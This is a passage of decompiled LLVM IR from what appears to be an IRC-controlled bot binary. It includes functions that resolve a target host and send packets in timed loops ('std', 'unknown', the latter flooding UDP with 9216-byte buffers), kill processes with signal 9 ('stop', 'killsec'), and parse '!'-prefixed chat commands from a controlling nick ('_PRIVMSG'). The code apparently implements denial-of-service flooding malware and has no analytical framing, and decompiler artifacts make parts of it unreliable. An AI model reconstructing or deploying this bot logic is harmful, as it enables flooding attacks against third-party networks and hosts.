  uselistorder i32 %v1_8b18, { 1, 0 }
  uselistorder i32 %v2_8aa4, { 1, 0 }
  uselistorder i32 %v5_8a7c, { 2, 3, 5, 4, 1, 0, 7, 6 }
  uselistorder i32 %v2_8a44, { 1, 0 }
  uselistorder i32 %v3_8a2c, { 1, 0 }
  uselistorder i32 %v3_89cc, { 1, 2, 3, 5, 4, 6, 0 }
  uselistorder i32 %v13_89b4, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 -1084, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8d70, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8d30, { 1, 0 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8c28, { 1, 0 }
  uselistorder label %dec_label_pc_8ba0, { 1, 0 }
  uselistorder label %dec_label_pc_8ab8, { 1, 0 }
  uselistorder label %dec_label_pc_8a9c, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36240, i32* %stack_var_-4, align 4
  %v2_8d8c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8d8c, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-72, align 4
  %v8_8dac = icmp sgt i32 %arg3, 2
  br i1 %v8_8dac, label %dec_label_pc_8db8, label %dec_label_pc_8db0

dec_label_pc_8db0:                                ; preds = %entry
  %v1_8db4 = call i32 @exit(i32 1)
  br label %dec_label_pc_8db8

dec_label_pc_8db8:                                ; preds = %entry, %dec_label_pc_8db0
  %v3_8dc4 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_8dd4 = call i32 @time(i32* null)
  %v3_8de0 = load i32, i32* %stack_var_-72, align 4
  %v1_8de4 = add i32 %v3_8de0, 12
  %v1_8de8 = inttoptr i32 %v1_8de4 to i32*
  %v2_8de8 = load i32, i32* %v1_8de8, align 4
  store i32 %v2_8de8, i32* @r0, align 4
  %v1_8df0 = call i32 @atol(i32 %v2_8de8)
  %v1_8e00 = call i32 @mfork(i32 %arg2)
  %v2_8e08 = icmp eq i32 %v1_8e00, 0
  br i1 %v2_8e08, label %dec_label_pc_8e10, label %dec_label_pc_8f28

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8db8
  %v3_8e10 = load i32, i32* %stack_var_-72, align 4
  %v1_8e14 = add i32 %v3_8e10, 4
  %v1_8e18 = inttoptr i32 %v1_8e14 to i32*
  %v2_8e18 = load i32, i32* %v1_8e18, align 4
  store i32 %v2_8e18, i32* @r0, align 4
  %v1_8e20 = call i32 @gethostbyname(i32 %v2_8e18)
  %v2_8e2c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8e2c, i32* @r0, align 4
  %v2_8e38 = call i32 @bzero(i32 %v2_8e2c, i32 16)
  %v1_8e40 = add i32 %v1_8e20, 16
  %v2_8e40 = inttoptr i32 %v1_8e40 to i32*
  %v3_8e40 = load i32, i32* %v2_8e40, align 4
  %v1_8e44 = inttoptr i32 %v3_8e40 to i32*
  %v2_8e44 = load i32, i32* %v1_8e44, align 4
  %v1_8e4c = add i32 %v1_8e20, 12
  %v2_8e4c = inttoptr i32 %v1_8e4c to i32*
  %v3_8e4c = load i32, i32* %v2_8e4c, align 4
  store i32 %v3_8e4c, i32* @r2, align 4
  %v2_8e58 = ptrtoint i32* %stack_var_-48 to i32
  %v3_8e64 = call i32 @bcopy(i32 %v2_8e44, i32 %v2_8e58, i32 %v3_8e4c)
  %v1_8e6c = add i32 %v1_8e20, 8
  %v2_8e6c = inttoptr i32 %v1_8e6c to i32*
  %v3_8e6c = load i32, i32* %v2_8e6c, align 4
  %v3_8e74 = urem i32 %v3_8e6c, 65536
  store i32 %v3_8e74, i32* %stack_var_-52, align 4
  %v3_8e7c = load i32, i32* %stack_var_-72, align 4
  %v1_8e80 = add i32 %v3_8e7c, 8
  %v1_8e84 = inttoptr i32 %v1_8e80 to i32*
  %v2_8e84 = load i32, i32* %v1_8e84, align 4
  store i32 %v2_8e84, i32* @r0, align 4
  %v1_8e8c = call i32 @atol(i32 %v2_8e84)
  %v2_8ef4 = add i32 %v1_8df0, %v2_8dd4
  br label %dec_label_pc_8ea8

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8f18, %dec_label_pc_8e10
  %storemerge1 = phi i32 [ 0, %dec_label_pc_8e10 ], [ %v1_8f1c, %dec_label_pc_8f18 ]
  %tmp = icmp ult i32 %storemerge1, 50
  br i1 %tmp, label %dec_label_pc_8f18, label %dec_label_pc_8eb4

dec_label_pc_8eb4:                                ; preds = %dec_label_pc_8ea8
  store i32 %v3_8dc4, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19ab4.310 to i32), i32* @r1, align 4
  store i32 50, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v5_8ec4 = call i32 @send(i32 %v3_8dc4, i32 ptrtoint ([4 x i8]* @global_var_19ab4.310 to i32), i32 50, i32 0)
  %v3_8ed8 = call i32 @connect(i32 %v3_8dc4, i32 %v2_8e2c, i32 16)
  %v2_8ee0 = call i32 @time(i32* null)
  %v3_8ef8 = icmp ult i32 %v2_8ee0, %v2_8ef4
  br i1 %v3_8ef8, label %dec_label_pc_8f10, label %dec_label_pc_8f00

dec_label_pc_8f00:                                ; preds = %dec_label_pc_8eb4
  %v1_8f04 = call i32 @close(i32 %v3_8dc4)
  %v1_8f0c = call i32 @exit(i32 0)
  br label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8eb4, %dec_label_pc_8f00
  br label %dec_label_pc_8f18

dec_label_pc_8f18:                                ; preds = %dec_label_pc_8ea8, %dec_label_pc_8f10
  %stack_var_-20.0 = phi i32 [ %storemerge1, %dec_label_pc_8ea8 ], [ 0, %dec_label_pc_8f10 ]
  %v1_8f1c = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_8ea8

dec_label_pc_8f28:                                ; preds = %dec_label_pc_8db8
  ret i32 %v1_8e00

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v2_8e2c, { 0, 2, 1 }
  uselistorder i32 %v3_8dc4, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8f18, { 1, 0 }
  uselistorder label %dec_label_pc_8f10, { 1, 0 }
  uselistorder label %dec_label_pc_8db8, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36676, i32* %stack_var_-4, align 4
  %v2_8f40 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8f40, i32* @fp, align 4
  %v0_8f48 = load i32, i32* @r0, align 4
  %v2_8fb8 = icmp eq i32 %arg2, 0
  %v2_902c14 = load i32, i32* @global_var_234bc.295, align 4
  %v3_903416 = icmp eq i32 %v2_902c14, 0
  br i1 %v3_903416, label %dec_label_pc_903c, label %dec_label_pc_8f64

dec_label_pc_8f64:                                ; preds = %dec_label_pc_901c, %entry
  %storemerge122 = phi i32 [ %v1_9020, %dec_label_pc_901c ], [ 0, %entry ]
  %v1_904421 = phi i32 [ %v1_90442, %dec_label_pc_901c ], [ %v0_8f48, %entry ]
  %v3_8f68 = mul i32 %storemerge122, 4
  %v2_8f74 = load i32, i32* @global_var_23e80.297, align 4
  %v2_8f78 = add i32 %v2_8f74, %v3_8f68
  %v1_8f7c = inttoptr i32 %v2_8f78 to i32*
  %v2_8f7c = load i32, i32* %v1_8f7c, align 4
  %v2_8f80 = icmp eq i32 %v2_8f7c, 0
  br i1 %v2_8f80, label %dec_label_pc_901c, label %dec_label_pc_8f88

dec_label_pc_8f88:                                ; preds = %dec_label_pc_8f64
  %v2_8fa0 = load i32, i32* %v1_8f7c, align 4
  store i32 %v2_8fa0, i32* @r4, align 4
  %v0_8fa4 = call i32 @getpid()
  store i32 %v0_8fa4, i32* @r0, align 4
  %v0_8fac = load i32, i32* @r4, align 4
  %v9_8fac = icmp eq i32 %v0_8fac, %v0_8fa4
  br i1 %v9_8fac, label %dec_label_pc_901c, label %dec_label_pc_8fb4

dec_label_pc_8fb4:                                ; preds = %dec_label_pc_8f88
  br i1 %v2_8fb8, label %dec_label_pc_8ff4, label %dec_label_pc_8fc0

dec_label_pc_8fc0:                                ; preds = %dec_label_pc_8fb4
  %v2_8fc4 = load i32, i32* @global_var_23e7c.313, align 4
  %v4_8ff0 = call i32 @Send(i32 %v0_8f48, i32 ptrtoint ([29 x i8]* @global_var_19ab8.315 to i32), i32 %v2_8fc4)
  br label %dec_label_pc_8ff4

dec_label_pc_8ff4:                                ; preds = %dec_label_pc_8fb4, %dec_label_pc_8fc0
  store i32 %v3_8f68, i32* @r2, align 4
  %v2_9004 = load i32, i32* @global_var_23e80.297, align 4
  %v2_9008 = add i32 %v2_9004, %v3_8f68
  %v1_900c = inttoptr i32 %v2_9008 to i32*
  %v2_900c = load i32, i32* %v1_900c, align 4
  store i32 %v2_900c, i32* @r0, align 4
  %v2_9018 = call i32 @kill(i32 %v2_900c, i32 9)
  store i32 %v2_9018, i32* @r0, align 4
  br label %dec_label_pc_901c

dec_label_pc_901c:                                ; preds = %dec_label_pc_8f88, %dec_label_pc_8f64, %dec_label_pc_8ff4
  %v1_90442 = phi i32 [ %v0_8fa4, %dec_label_pc_8f88 ], [ %v1_904421, %dec_label_pc_8f64 ], [ %v2_9018, %dec_label_pc_8ff4 ]
  %v1_9020 = add i32 %storemerge122, 1
  %v2_902c = load i32, i32* @global_var_234bc.295, align 4
  %v3_9034 = icmp ult i32 %v1_9020, %v2_902c
  br i1 %v3_9034, label %dec_label_pc_8f64, label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_901c, %entry
  %v1_9044.lcssa = phi i32 [ %v0_8f48, %entry ], [ %v1_90442, %dec_label_pc_901c ]
  ret i32 %v1_9044.lcssa

; uselistorder directives
  uselistorder i32 %v1_9020, { 1, 0 }
  uselistorder i32 %v3_8f68, { 2, 0, 1 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %v0_8f48, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_901c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8ff4, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36964, i32* %stack_var_-4, align 4
  %v2_9060 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9060, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 9216, i32* @r0, align 4
  %v0_9084 = call i32 @malloc()
  %v2_9094 = call i32 @time(i32* null)
  %v1_90a4 = call i32 @mfork(i32 %arg2)
  %v2_90ac = icmp eq i32 %v1_90a4, 0
  br i1 %v2_90ac, label %dec_label_pc_90b4, label %dec_label_pc_921c

dec_label_pc_90b4:                                ; preds = %entry
  %v7_90b8 = icmp eq i32 %arg3, 2
  br i1 %v7_90b8, label %dec_label_pc_90c8, label %dec_label_pc_90c0

dec_label_pc_90c0:                                ; preds = %dec_label_pc_90b4
  %v1_90c4 = call i32 @exit(i32 1)
  br label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %dec_label_pc_90b4, %dec_label_pc_90c0
  %v1_90cc = add i32 %arg4, 8
  %v1_90d0 = inttoptr i32 %v1_90cc to i32*
  %v2_90d0 = load i32, i32* %v1_90d0, align 4
  store i32 %v2_90d0, i32* @r0, align 4
  %v1_90d8 = call i32 @atol(i32 %v2_90d0)
  %v2_90e4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_90e4, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_90f4 = call i32 @memset()
  %v1_90fc = add i32 %arg4, 4
  %v1_9100 = inttoptr i32 %v1_90fc to i32*
  %v2_9100 = load i32, i32* %v1_9100, align 4
  %v2_910c = call i32 @host2ip(i32 %arg2, i32 %v2_9100)
  store i32 2, i32* %stack_var_-60, align 4
  %v2_9124 = load i32, i32* @global_var_23e7c.313, align 4
  %v4_913c = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_19ad8.319 to i32), i32 %v2_9124)
  %v2_91e8 = add i32 %v1_90d8, %v2_9094
  %v2_9180 = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_9140

dec_label_pc_9140:                                ; preds = %dec_label_pc_91fc, %dec_label_pc_90c8
  %stack_var_-36.0 = phi i32 [ %tmp, %dec_label_pc_90c8 ], [ %v1_9200, %dec_label_pc_91fc ]
  %v0_9140 = call i32 @rand()
  %v3_9160 = call i32 @socket(i32 2, i32 2, i32 17)
  %v1_9170 = icmp slt i32 %v3_9160, 0
  br i1 %v1_9170, label %dec_label_pc_91c4, label %dec_label_pc_9178

dec_label_pc_9178:                                ; preds = %dec_label_pc_9140
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %v3_9160, i32* @r0, align 4
  %v3_9194 = call i32 @ioctl(i32 %v3_9160, i32 21537, i32 %v2_9180)
  store i32 %v3_9160, i32* @r0, align 4
  store i32 %v0_9084, i32* @r1, align 4
  store i32 9216, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_91b8 = call i32 @sendto()
  %v1_91c0 = call i32 @close(i32 %v3_9160)
  br label %dec_label_pc_91c4

dec_label_pc_91c4:                                ; preds = %dec_label_pc_9140, %dec_label_pc_9178
  %v7_91cc = icmp slt i32 %stack_var_-36.0, 50
  br i1 %v7_91cc, label %dec_label_pc_91fc, label %dec_label_pc_91d0

dec_label_pc_91d0:                                ; preds = %dec_label_pc_91c4
  %v2_91d4 = call i32 @time(i32* null)
  %v3_91ec = icmp ult i32 %v2_91d4, %v2_91e8
  br i1 %v3_91ec, label %dec_label_pc_91f4, label %dec_label_pc_920c

dec_label_pc_91f4:                                ; preds = %dec_label_pc_91d0
  br label %dec_label_pc_91fc

dec_label_pc_91fc:                                ; preds = %dec_label_pc_91c4, %dec_label_pc_91f4
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_91c4 ], [ 0, %dec_label_pc_91f4 ]
  %v1_9200 = add i32 %stack_var_-36.1, 1
  br label %dec_label_pc_9140

dec_label_pc_920c:                                ; preds = %dec_label_pc_91d0
  %v1_9210 = call i32 @close(i32 %v3_9160)
  %v1_9218 = call i32 @exit(i32 0)
  br label %dec_label_pc_921c

dec_label_pc_921c:                                ; preds = %entry, %dec_label_pc_920c
  %v1_9224 = phi i32 [ %v1_90a4, %entry ], [ %v1_9218, %dec_label_pc_920c ]
  ret i32 %v1_9224

; uselistorder directives
  uselistorder i32 %v3_9160, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 1, 0 }
  uselistorder label %dec_label_pc_921c, { 1, 0 }
  uselistorder label %dec_label_pc_91fc, { 1, 0 }
  uselistorder label %dec_label_pc_91c4, { 1, 0 }
  uselistorder label %dec_label_pc_90c8, { 1, 0 }
}

define i32 @killsec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_9254 = load i32, i32* bitcast ([2 x i8*]* @global_var_23420.323 to i32*), align 4
  %tmp10 = inttoptr i32 %v2_9254 to i8*
  %v4_9260 = call i32 @strcasecmp(i8* %tmp10, i32 %arg2)
  %v2_9268 = icmp eq i32 %v4_9260, 0
  br i1 %v2_9268, label %dec_label_pc_9270, label %dec_label_pc_927c

dec_label_pc_9270:                                ; preds = %entry
  store i32 0, i32* @r0, align 4
  %v2_9278 = call i32 @kill(i32 0, i32 9)
  br label %dec_label_pc_927c

dec_label_pc_927c:                                ; preds = %entry, %dec_label_pc_9270
  %v1_9284 = phi i32 [ %v4_9260, %entry ], [ %v2_9278, %dec_label_pc_9270 ]
  ret i32 %v1_9284

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 1, 0 }
  uselistorder label %dec_label_pc_927c, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp32 = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-1116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 37528, i32* %stack_var_-4, align 4
  %v2_9294 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9294, i32* @fp, align 4
  br label %dec_label_pc_92c4

dec_label_pc_92b8:                                ; preds = %dec_label_pc_92dc
  %v1_92bc = add i32 %storemerge11, 1
  br label %dec_label_pc_92c4

dec_label_pc_92c4:                                ; preds = %entry, %dec_label_pc_92b8
  %storemerge11 = phi i32 [ 0, %entry ], [ %v1_92bc, %dec_label_pc_92b8 ]
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v3_92cc = call i32 @strlen(i8* %tmp)
  store i32 %v3_92cc, i32* %r0.global-to-local, align 4
  %v3_92d4 = icmp ult i32 %storemerge11, %v3_92cc
  br i1 %v3_92d4, label %dec_label_pc_92dc, label %dec_label_pc_92c4.dec_label_pc_92f8_crit_edge

dec_label_pc_92c4.dec_label_pc_92f8_crit_edge:    ; preds = %dec_label_pc_92c4
  %.pre = add i32 %storemerge11, %arg3
  %.pre24 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_92f8

dec_label_pc_92dc:                                ; preds = %dec_label_pc_92c4
  %v2_92e8 = add i32 %storemerge11, %arg3
  %v1_92ec = inttoptr i32 %v2_92e8 to i8*
  %v2_92ec = load i8, i8* %v1_92ec, align 1
  %v7_92f0 = icmp eq i8 %v2_92ec, 32
  br i1 %v7_92f0, label %dec_label_pc_92f8, label %dec_label_pc_92b8

dec_label_pc_92f8:                                ; preds = %dec_label_pc_92dc, %dec_label_pc_92c4.dec_label_pc_92f8_crit_edge
  %v3_930c.pre-phi = phi i8* [ %.pre24, %dec_label_pc_92c4.dec_label_pc_92f8_crit_edge ], [ %v1_92ec, %dec_label_pc_92dc ]
  %v2_9304.pre-phi = phi i32 [ %.pre, %dec_label_pc_92c4.dec_label_pc_92f8_crit_edge ], [ %v2_92e8, %dec_label_pc_92dc ]
  store i8 0, i8* %v3_930c.pre-phi, align 1
  %v1_9328 = add i32 %v2_9304.pre-phi, 2
  %v5_932c = inttoptr i32 %v1_9328 to i8*
  br label %dec_label_pc_9348

dec_label_pc_933c:                                ; preds = %dec_label_pc_9360
  %v1_9340 = add i32 %storemerge12, 1
  br label %dec_label_pc_9348

dec_label_pc_9348:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_933c
  %storemerge12 = phi i32 [ 0, %dec_label_pc_92f8 ], [ %v1_9340, %dec_label_pc_933c ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %v3_9350 = call i32 @strlen(i8* %arg2)
  store i32 %v3_9350, i32* %r0.global-to-local, align 4
  %v0_9358 = load i32, i32* @r4, align 4
  %v3_9358 = icmp ult i32 %v0_9358, %v3_9350
  br i1 %v3_9358, label %dec_label_pc_9360, label %dec_label_pc_9348.dec_label_pc_937c_crit_edge

dec_label_pc_9348.dec_label_pc_937c_crit_edge:    ; preds = %dec_label_pc_9348
  %.pre25 = add i32 %storemerge12, %tmp32
  %.pre26 = inttoptr i32 %.pre25 to i8*
  br label %dec_label_pc_937c

dec_label_pc_9360:                                ; preds = %dec_label_pc_9348
  %v2_936c = add i32 %storemerge12, %tmp32
  %v1_9370 = inttoptr i32 %v2_936c to i8*
  %v2_9370 = load i8, i8* %v1_9370, align 1
  %v7_9374 = icmp eq i8 %v2_9370, 33
  br i1 %v7_9374, label %dec_label_pc_937c, label %dec_label_pc_933c

dec_label_pc_937c:                                ; preds = %dec_label_pc_9360, %dec_label_pc_9348.dec_label_pc_937c_crit_edge
  %v3_9390.pre-phi = phi i8* [ %.pre26, %dec_label_pc_9348.dec_label_pc_937c_crit_edge ], [ %v1_9370, %dec_label_pc_9360 ]
  store i8 0, i8* %v3_9390.pre-phi, align 1
  %v2_9398 = load i8, i8* %v5_932c, align 1
  %v7_939c = icmp eq i8 %v2_9398, 33
  br i1 %v7_939c, label %dec_label_pc_93a4, label %dec_label_pc_97e4

dec_label_pc_93a4:                                ; preds = %dec_label_pc_937c
  %v2_93a8 = load i32, i32* @global_var_23e7c.313, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v4_93b4 = call i32 @strcasecmp(i8* %tmp, i32 %v2_93a8)
  store i32 %v4_93b4, i32* %r0.global-to-local, align 4
  %v2_93bc = icmp eq i32 %v4_93b4, 0
  br i1 %v2_93bc, label %dec_label_pc_93c4, label %dec_label_pc_97e4

dec_label_pc_93c4:                                ; preds = %dec_label_pc_93a4
  %v2_93cc = ptrtoint i32* %stack_var_-1116 to i32
  store i32 1024, i32* @r2, align 4
  store i32 %v2_93cc, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_93dc = call i32 @memset()
  store i32 %v0_93dc, i32* %r0.global-to-local, align 4
  %v1_93ec = add i32 %v2_9304.pre-phi, 3
  %v5_93f0 = inttoptr i32 %v1_93ec to i8*
  br label %dec_label_pc_940c

dec_label_pc_9400:                                ; preds = %dec_label_pc_9424
  %v1_9404 = add i32 %storemerge13, 1
  br label %dec_label_pc_940c

dec_label_pc_940c:                                ; preds = %dec_label_pc_93c4, %dec_label_pc_9400
  %storemerge13 = phi i32 [ 0, %dec_label_pc_93c4 ], [ %v1_9404, %dec_label_pc_9400 ]
  store i32 %storemerge13, i32* @r4, align 4
  store i32 %v1_93ec, i32* %r0.global-to-local, align 4
  %v3_9414 = call i32 @strlen(i8* %v5_93f0)
  store i32 %v3_9414, i32* %r0.global-to-local, align 4
  %v0_941c = load i32, i32* @r4, align 4
  %v3_941c = icmp ult i32 %v0_941c, %v3_9414
  br i1 %v3_941c, label %dec_label_pc_9424, label %dec_label_pc_940c.dec_label_pc_9440_crit_edge

dec_label_pc_940c.dec_label_pc_9440_crit_edge:    ; preds = %dec_label_pc_940c
  %.pre27 = add i32 %storemerge13, %v1_93ec
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_9440

dec_label_pc_9424:                                ; preds = %dec_label_pc_940c
  %v2_9430 = add i32 %storemerge13, %v1_93ec
  %v1_9434 = inttoptr i32 %v2_9430 to i8*
  %v2_9434 = load i8, i8* %v1_9434, align 1
  %v7_9438 = icmp eq i8 %v2_9434, 32
  br i1 %v7_9438, label %dec_label_pc_9440, label %dec_label_pc_9400

dec_label_pc_9440:                                ; preds = %dec_label_pc_9424, %dec_label_pc_940c.dec_label_pc_9440_crit_edge
  %v3_9454.pre-phi = phi i8* [ %.pre28, %dec_label_pc_940c.dec_label_pc_9440_crit_edge ], [ %v1_9434, %dec_label_pc_9424 ]
  store i8 0, i8* %v3_9454.pre-phi, align 1
  %v2_9460 = load i32, i32* @global_var_23e64.326, align 4
  store i32 %v1_93ec, i32* %r0.global-to-local, align 4
  %v3_946c = call i32 @strwildmatch(i8* %v5_93f0, i32 %v2_9460)
  store i32 %v3_946c, i32* %r0.global-to-local, align 4
  %v2_9474 = icmp eq i32 %v3_946c, 0
  br i1 %v2_9474, label %dec_label_pc_947c, label %dec_label_pc_97e4

dec_label_pc_947c:                                ; preds = %dec_label_pc_9440
  %v1_9480 = add i32 %v2_9304.pre-phi, 4
  %v2_9488 = add i32 %storemerge13, %v1_9480
  %v5_948c = inttoptr i32 %v2_9488 to i8*
  store i32 %v2_9488, i32* %r0.global-to-local, align 4
  %v3_9494 = call i32 @strlen(i8* %v5_948c)
  store i32 %v3_9494, i32* %r0.global-to-local, align 4
  %v2_94e0 = ptrtoint i32* %stack_var_-24 to i32
  %v2_94e4 = add i32 %v2_94e0, -1092
  br label %dec_label_pc_950c

dec_label_pc_94ac:                                ; preds = %dec_label_pc_950c
  %v2_94b0 = load i8, i8* %stack_var_-36.0, align 1
  %v7_94b4 = icmp eq i8 %v2_94b0, 32
  br i1 %v7_94b4, label %dec_label_pc_955c, label %dec_label_pc_94bc

dec_label_pc_94bc:                                ; preds = %dec_label_pc_94ac
  %v2_94c0 = load i8, i8* %stack_var_-36.0, align 1
  %v2_94c4 = icmp eq i8 %v2_94c0, 0
  br i1 %v2_94c4, label %dec_label_pc_955c, label %dec_label_pc_94cc

dec_label_pc_94cc:                                ; preds = %dec_label_pc_94bc
  %v2_94d4 = load i8, i8* %stack_var_-36.0, align 1
  store i32 %v2_94e0, i32* %r0.global-to-local, align 4
  %v2_94e8 = add i32 %v2_94e4, %storemerge14
  %v3_94f0 = inttoptr i32 %v2_94e8 to i8*
  store i8 %v2_94d4, i8* %v3_94f0, align 1
  %v1_94f8 = add i32 %v4_94ac, 1
  %v5_94fc = inttoptr i32 %v1_94f8 to i8*
  %v1_9504 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_950c

dec_label_pc_950c:                                ; preds = %dec_label_pc_947c, %dec_label_pc_94cc
  %stack_var_-36.0 = phi i8* [ %v5_948c, %dec_label_pc_947c ], [ %v5_94fc, %dec_label_pc_94cc ]
  %storemerge14 = phi i32 [ 0, %dec_label_pc_947c ], [ %v1_9504, %dec_label_pc_94cc ]
  %v5_9518 = icmp slt i32 %storemerge14, %v3_9494
  %v4_94ac = ptrtoint i8* %stack_var_-36.0 to i32
  br i1 %v5_9518, label %dec_label_pc_94ac, label %dec_label_pc_955c

dec_label_pc_9528:                                ; preds = %dec_label_pc_955c
  %v2_9534 = add i32 %storemerge15, %v4_94ac
  %v1_9538 = inttoptr i32 %v2_9534 to i8*
  %v2_9538 = load i8, i8* %v1_9538, align 1
  %v7_953c = icmp eq i8 %v2_9538, 32
  br i1 %v7_953c, label %dec_label_pc_9544, label %dec_label_pc_9550

dec_label_pc_9544:                                ; preds = %dec_label_pc_9528
  %v1_9548 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_9550

dec_label_pc_9550:                                ; preds = %dec_label_pc_9528, %dec_label_pc_9544
  %stack_var_-32.0 = phi i32 [ %v1_9548, %dec_label_pc_9544 ], [ %stack_var_-32.1, %dec_label_pc_9528 ]
  %v1_9554 = add i32 %storemerge15, 1
  br label %dec_label_pc_955c

dec_label_pc_955c:                                ; preds = %dec_label_pc_94ac, %dec_label_pc_94bc, %dec_label_pc_950c, %dec_label_pc_9550
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_9550 ], [ 0, %dec_label_pc_950c ], [ 0, %dec_label_pc_94bc ], [ 0, %dec_label_pc_94ac ]
  %storemerge15 = phi i32 [ %v1_9554, %dec_label_pc_9550 ], [ 0, %dec_label_pc_950c ], [ 0, %dec_label_pc_94bc ], [ 0, %dec_label_pc_94ac ]
  store i32 %storemerge15, i32* @r4, align 4
  store i32 %v4_94ac, i32* %r0.global-to-local, align 4
  %v3_9564 = call i32 @strlen(i8* %stack_var_-36.0)
  store i32 %v3_9564, i32* %r0.global-to-local, align 4
  %v0_956c = load i32, i32* @r4, align 4
  %v3_956c = icmp ult i32 %v0_956c, %v3_9564
  br i1 %v3_956c, label %dec_label_pc_9528, label %dec_label_pc_9574

dec_label_pc_9574:                                ; preds = %dec_label_pc_955c
  %v1_9578 = add i32 %stack_var_-32.1, 1
  %v7_9588 = icmp slt i32 %v1_9578, 11
  br i1 %v7_9588, label %dec_label_pc_9594, label %dec_label_pc_958c

dec_label_pc_958c:                                ; preds = %dec_label_pc_9574
  br label %dec_label_pc_9594

dec_label_pc_9594:                                ; preds = %dec_label_pc_9574, %dec_label_pc_958c
  %stack_var_-32.2 = phi i32 [ %v1_9578, %dec_label_pc_9574 ], [ 10, %dec_label_pc_958c ]
  %tmp77 = mul i32 %stack_var_-32.2, 4
  %v3_95b0 = add i32 %tmp77, 4
  %v2_95b8 = add i32 %v2_94e0, -68
  %v2_95bc = add i32 %v2_95b8, %v3_95b0
  %v2_95c4 = inttoptr i32 %v2_95bc to i32*
  store i32 ptrtoint (i32* @global_var_19b3c.328 to i32), i32* %v2_95c4, align 4
  %v2_96ec19 = load i8, i8* %stack_var_-36.0, align 1
  %v2_96f021 = icmp eq i8 %v2_96ec19, 0
  br i1 %v2_96f021, label %dec_label_pc_96f8, label %dec_label_pc_95d4

dec_label_pc_95d4:                                ; preds = %dec_label_pc_9594, %dec_label_pc_963c
  %v4_96e823 = phi i32 [ %v2_96e0.pre-phi, %dec_label_pc_963c ], [ %v4_94ac, %dec_label_pc_9594 ]
  %stack_var_-28.022 = phi i32 [ %v1_96cc, %dec_label_pc_963c ], [ 1, %dec_label_pc_9594 ]
  %v1_95d8 = add i32 %v4_96e823, 1
  %v5_95dc = inttoptr i32 %v1_95d8 to i8*
